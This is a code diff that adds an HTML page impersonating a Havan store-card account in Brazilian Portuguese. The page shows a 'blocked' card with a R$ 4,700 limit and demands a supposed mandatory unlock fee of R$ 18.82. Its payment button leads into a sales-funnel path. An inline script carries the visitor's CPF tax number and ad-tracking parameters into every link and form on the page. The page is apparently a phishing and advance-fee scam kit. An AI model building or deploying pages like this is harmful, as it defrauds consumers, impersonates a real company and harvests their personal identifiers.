@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Havan Card - Minha Conta</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="app-container">
+        <!-- Header -->
+        <header class="app-header">
+            <div class="header-content">
+                <div class="logo-section">
+                    <div class="havan-logo">
+                        <div class="logo-oval">H</div>
+                        <span class="logo-text">HAVAN</span>
+                    </div>
+                </div>
+                <div class="user-section">
+                    <i class="fas fa-bell notification-icon"></i>
+                    <div class="user-avatar">
+                        <i class="fas fa-user"></i>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Card Section -->
+            <section class="card-section">
+                <div class="card-container">
+                    <div class="credit-card blocked">
+                        <div class="card-header">
+                            <div class="card-logo">
+                                <div class="havan-logo-card">H</div>
+                            </div>
+                            <div class="card-status">
+                                <i class="fas fa-lock"></i>
+                                <span>BLOQUEADO</span>
+                            </div>
+                        </div>
+                        <div class="card-number">
+                            <span>**** **** **** 7834</span>
+                        </div>
+                        <div class="card-info">
+                        <div class="card-holder">
+                            <span class="label">PORTADOR</span>
+                            <span class="value"></span>
+                        </div>
+                            <div class="card-expiry">
+                                <span class="label">VÁLIDO ATÉ</span>
+                                <span class="value">12/32</span>
+                            </div>
+                        </div>
+                        <div class="card-brand">
+                            <span>VISA</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Account Info -->
+            <section class="account-info">
+                <div class="info-card">
+                    <h2>Informações da Conta</h2>
+                    <div class="info-grid">
+                        <div class="info-item">
+                            <span class="info-label">Limite Total</span>
+                            <span class="info-value limit-total">R$ 4.700,00</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Limite Utilizado</span>
+                            <span class="info-value limit-used">R$ 0,00</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Limite Disponível</span>
+                            <span class="info-value limit-available">R$ 4.700,00</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Próximo Vencimento</span>
+                            <span class="info-value">15/09/2025</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Status Alert -->
+            <section class="status-alert">
+                <div class="alert-card blocked-alert">
+                    <div class="alert-icon">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <div class="alert-content">
+                        <h3>Cartão Temporariamente Bloqueado</h3>
+                        <p>Seu cartão foi bloqueado por segurança. Para desbloqueá-lo e ativar todos os benefícios, é necessário o pagamento de uma taxa obrigatória de <strong>R$ 18,82</strong>.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Action Buttons -->
+            <section class="action-buttons">
+                <button class="btn btn-primary unlock-btn" onclick="showUnlockModal()">
+                    <i class="fas fa-unlock"></i>
+                    Desbloquear Cartão
+                </button>
+                <button class="btn btn-secondary">
+                    <i class="fas fa-history"></i>
+                    Ver Extrato
+                </button>
+                <button class="btn btn-secondary">
+                    <i class="fas fa-cog"></i>
+                    Configurações
+                </button>
+            </section>
+
+            <!-- Benefits Section -->
+            <section class="benefits-section">
+                <div class="benefits-card">
+                    <h3>Benefícios do seu Cartão Havan</h3>
+                    <div class="benefits-list">
+                        <div class="benefit-item">
+                            <i class="fas fa-percentage"></i>
+                            <span>Desconto exclusivo nas Lojas Havan</span>
+                        </div>
+                        <div class="benefit-item">
+                            <i class="fas fa-gift"></i>
+                            <span>Programa de pontos e recompensas</span>
+                        </div>
+                        <div class="benefit-item">
+                            <i class="fas fa-shield-alt"></i>
+                            <span>Seguro contra fraudes</span>
+                        </div>
+                        <div class="benefit-item">
+                            <i class="fas fa-mobile-alt"></i>
+                            <span>Controle total pelo app</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <!-- Bottom Navigation -->
+        <nav class="bottom-nav">
+            <div class="nav-item active">
+                <i class="fas fa-home"></i>
+                <span>Início</span>
+            </div>
+            <div class="nav-item">
+                <i class="fas fa-credit-card"></i>
+                <span>Cartões</span>
+            </div>
+            <div class="nav-item">
+                <i class="fas fa-chart-line"></i>
+                <span>Extrato</span>
+            </div>
+            <div class="nav-item">
+                <i class="fas fa-user"></i>
+                <span>Perfil</span>
+            </div>
+        </nav>
+    </div>
+
+    <!-- Modal for Unlock -->
+    <div id="unlockModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Desbloqueio do Cartão</h3>
+                <span class="close" onclick="closeUnlockModal()">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div class="fee-alert">
+                    <div class="alert-icon">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <div class="alert-text">
+                        <h4>Taxa de Desbloqueio Obrigatória</h4>
+                        <p>Para desbloquear seu cartão Havan e liberar o limite de R$ 4.700,00, é necessário o pagamento de uma taxa de segurança.</p>
+                    </div>
+                </div>
+                
+                <div class="fee-display">
+                    <span class="fee-label">Valor da Taxa:</span>
+                    <span class="fee-price">R$ 18,82</span>
+                </div>
+                </div>
+                
+                <button class="payment-button" onclick="window.location.href='/funil/pos/up5check/'+window.location.search">
+                    <i class="fas fa-credit-card"></i>
+                    REALIZAR PAGAMENTO
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script defer src="data.js"></script>
+    <script defer src="script.js"></script>
+
+<script>
+(function() {
+    function updateAllLinksAndForms() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const utms = {};
+        urlParams.forEach((value, key) => {
+            if (key.startsWith('utm_') || key === 'cpf' || key === 'fbclid' || key === 'gclid') {
+                utms[key] = value;
+            }
+        });
+
+        if (Object.keys(utms).length === 0) return;
+
+        document.querySelectorAll('a').forEach(link => {
+            try {
+                const href = link.getAttribute('href');
+                if (!href || href.startsWith('#') || href.startsWith('javascript:')) return;
+                
+                let url;
+                try {
+                    url = new URL(href, window.location.origin);
+                } catch(e) {
+                    const separator = href.includes('?') ? '&' : '?';
+                    const linkParams = new URLSearchParams();
+                    Object.keys(utms).forEach(key => linkParams.set(key, utms[key]));
+                    link.href = href + separator + linkParams.toString();
+                    return;
+                }
+
+                if (url.origin === window.location.origin || href.startsWith('.') || href.startsWith('/')) {
+                    const linkParams = new URLSearchParams(url.search);
+                    Object.keys(utms).forEach(key => linkParams.set(key, utms[key]));
+                    url.search = linkParams.toString();
+                    link.href = url.toString();
+                }
+            } catch (e) {}
+        });
+
+        document.querySelectorAll('form').forEach(form => {
+            Object.keys(utms).forEach(key => {
+                let input = form.querySelector(`input[name="${key}"]`);
+                if (!input) {
+                    input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    form.appendChild(input);
+                }
+                input.value = utms[key];
+            });
+        });
+    }
+
+    updateAllLinksAndForms();
+    window.addEventListener('load', updateAllLinksAndForms);
+    document.addEventListener('DOMContentLoaded', updateAllLinksAndForms);
+    const observer = new MutationObserver(updateAllLinksAndForms);
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+})();
+</script>
+
+</body>
+</html>
